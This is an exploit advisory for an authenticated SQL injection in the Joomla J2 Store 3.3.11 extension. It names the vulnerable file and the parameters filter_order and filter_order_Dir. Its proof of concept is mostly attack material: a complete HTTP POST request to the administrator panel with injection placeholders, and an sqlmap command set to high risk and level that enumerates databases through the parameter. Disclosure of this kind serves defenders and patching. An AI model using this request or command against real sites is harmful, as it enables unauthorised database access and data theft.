Exploit Title: Joomla J2 Store 3.3.11 - 'filter_order_Dir'  SQL Injection (Authenticated)<br>
Date: 2020-04-17<br>
Exploit Author: Mehmet Kelepçe / Gais Cyber Security<br>
Vendor Homepage: https://www.j2store.org/<br>
Software Link: https://www.j2store.org/download.html<br>
Reference: https://www.j2store.org/download-j2store/j2store-v3-3-3-13.html<br>
Change Log: https://www.j2store.org/download-j2store/j2store-v3-3-3-13.html<br>
Version: 3.3.11<br>
Tested on: Kali Linux - Apache2<br>
-<br>
Detail:<br>
-<br>
File: administrator/components/com_j2store/models/products.php<br>
Vulnerable parameter: filter_order_Dir, filter_order<br>
<br>
PoC:<br>
Request:<br>
<br>
<br>
-<br>
POST /joomla/administrator/index.php HTTP/1.1<br>
Host: localhost<br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accept-Encoding: gzip, deflate<br>
Referer: http://localhost/joomla/administrator/index.php?option=com_j2store&view=products<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 312<br>
Connection: close<br>
Cookie: [COOKIE]<br>
Upgrade-Insecure-Requests: 1<br>
<br>
option=com_j2store&view=products&task=browse&boxchecked=0&filter_order=[SQLi]&filter_order_Dir=[SQLi]&2d42ab72d5c2716881de5d802d08ca7f=1&search=1&product_type=0&limit=20&since=&until=&productid_from=&productid_to=&pricefrom=&priceto=&sku=&manufacturer_id=&vendor_id=&taxprofile_id=&visible=&limitstart=0
<br>-
<br>
<br>
<br>
sqlmap -r sqli --dbs --risk=3 --level=5 --random-agent -p filter_order_Dir<br>
<br>


